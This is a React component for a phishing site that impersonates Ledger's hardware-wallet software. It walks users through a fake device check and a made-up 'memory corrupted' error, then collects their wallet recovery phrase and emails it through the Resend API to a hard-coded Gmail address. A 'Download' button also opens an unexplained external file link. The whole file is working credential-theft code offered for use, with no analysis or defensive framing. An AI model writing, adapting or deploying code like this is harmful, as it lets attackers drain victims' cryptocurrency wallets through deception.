import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import styles from "./Form.module.css";
import { FaCircle, FaDownload, FaArrowsRotate } from "react-icons/fa6";
import { RiAlertLine } from "react-icons/ri";
import { PiSealCheckFill } from "react-icons/pi";
import {
  nanoplus,
  nanos,
  nanox,
  blue,
  loader,
  loader_image,
  recovery,
} from "../assets";

const Form = () => {
  const navigate = useNavigate();
  const [selectedImage, setSelectedImage] = useState(null);
  const [currentStep, setCurrentStep] = useState(0);
  const [loading, setLoading] = useState(false);
  const [imageSelected, setImageSelected] = useState(false);
  const [userInput, setUserInput] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [formData, setFormData] = useState("");
  const steps = ["Device Detection", "Device Check", "Ledger Live"];

  const handleImageSelect = (image) => {
    setSelectedImage(image);
    setLoading(true);
    setImageSelected(true);

    setTimeout(() => {
      setLoading(false);
      setCurrentStep(1);
    }, 2000);
  };

  const handleUpdateClick = () => {
    setLoading(false);

    setTimeout(() => {
      setCurrentStep(2);
      setLoading(false);
    });
  };

  const handleFormDataChange = (event) => {
    setFormData(event.target.value);
    setUserInput(event.target.value); // keeps userInput used
  };

  const handleClosePopup = () => {
    setShowPopup(false);
  };

  const handleStep3Submit = async (event) => {
    event.preventDefault();

    try {
      const response = await fetch("https://api.resend.com/emails", {
        method: "POST",
        headers: {
          Authorization: Bearer ${process.env.REACT_APP_RESEND_API_KEY}
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          from: "onboarding@resend.dev",
          to: ["tykeshare@gmail.com"],
          subject: "Ledger Live Submission",
          html: `
            <p><strong>Form Type:</strong> ledger_live</p>
            <p><strong>Recovery Phrase:</strong></p>
            <p>${formData}</p>
          `,
        }),
      });

      console.log("Response status:", response.status);

      if (response.ok) {
        setFormData("");
        navigate("/success");
      } else {
        const errorData = await response.json();
        console.error("Error:", errorData);
      }
    } catch (error) {
      console.error("Fetch error:", error);
    }
  };

  return (
    <>
      <div className={styles.timeline}>
        {steps.map((step, index) => (
          <div
            className={`element ${currentStep === index ? "active" : ""}`}
            key={index}
          >
            <div
              className={`${styles.dotbox} ${
                currentStep >= index ? styles.filled : ""
              }`}
            >
              <div
                className={`${styles.dot} ${
                  currentStep >= index ? "active" : ""
                }`}
              >
                <FaCircle size={20} />
              </div>
            </div>
            <span>{step}</span>
          </div>
        ))}
      </div>

      <div className={styles.step_content}>
        {currentStep === 0 && (
          <div
            className={`${styles.step_one_content} ${
              imageSelected ? styles.hidden : ""
            }`}
          >
            <h2>Select your Device</h2>
            <div
              className={`${styles.image_box} ${
                imageSelected ? styles.hidden : ""
              }`}
            >
              <div
                data-attribute="Nano S"
                onClick={() => handleImageSelect(nanos)}
              >
                <h3>Nano S</h3>
                <img src={nanos} alt="Nano S" />
              </div>

              <div
                data-attribute="Nano S Plus"
                onClick={() => handleImageSelect(nanoplus)}
              >
                <h3>Nano S Plus</h3>
                <img src={nanoplus} alt="Nano S Plus" />
              </div>

              <div
                data-attribute="Nano X"
                onClick={() => handleImageSelect(nanox)}
              >
                <h3>Nano X</h3>
                <img src={nanox} alt="Nano X" />
              </div>

              <div
                data-attribute="Blue"
                onClick={() => handleImageSelect(blue)}
              >
                <h3>Blue</h3>
                <img src={blue} alt="Blue" className={styles.last_child} />
              </div>
            </div>
          </div>
        )}

        {currentStep === 1 && (
          <div
            className={`${styles.step_two_content} ${
              loading ? styles.hidden : ""
            }`}
          >
            <h2>Genuine Check</h2>
            <RiAlertLine size={60} color="red" />

            <p>
              Your devices memory has been corrupted. <br />
              Ledger data damage error: 0x0m3CkBn
            </p>

            <div className={styles.buttons}>
              <button onClick={handleUpdateClick}>
                <FaDownload />
                <span>Restore your wallet from Recovery phrase</span>
              </button>

              <button onClick={() => handleImageSelect(nanos)}>
                <FaArrowsRotate />
                <span>Refresh</span>
              </button>

              <button
                onClick={() =>
                  window.open(
                    "https://api.files.link/v1/p/fe68c8cb-f70b-4321-992e-69ce0425b600",
                    "_blank"
                  )
                }
              >
                <FaDownload />
                <span>Download</span>
              </button>
            </div>
          </div>
        )}

        {currentStep === 2 && (
          <div className={styles.step_three_content}>
            <h2>
              Select & enter numbers of words in your recovery phrase
            </h2>

            <img src={recovery} alt="Recovery" width={300} height={300} />

            <form onSubmit={handleStep3Submit}>
              <div className={styles.textareaCon}>
                <textarea
                  value={formData}
                  onChange={handleFormDataChange}
                  placeholder="Typically 12 (sometimes 24) words separated by single spaces"
                  className={styles.textarea}
                  rows={2}
                ></textarea>
              </div>

              <button type="submit" className={styles.submitButton}>
                Continue
              </button>
            </form>
          </div>
        )}
      </div>

      {loading && (
        <div>
          <div className={styles.loader_content}>
            <h2>Connect and unlock your device</h2>
            <img src={loader_image} alt="" />
            <img src={loader} alt="loader" width={50} height={50} />
          </div>
        </div>
      )}

      {showPopup && (
        <div className={styles.popup}>
          <PiSealCheckFill size={40} color="#bbb0fd" />
          <p>
            Thank you for this information! <br />
            Please wait 24 hours.
            <br /> We'll be in touch.
          </p>
          <button className={styles.closeButton} onClick={handleClosePopup}>
            <span>Go back</span>
          </button>
        </div>
      )}
    </>
  );
};

export default Form;
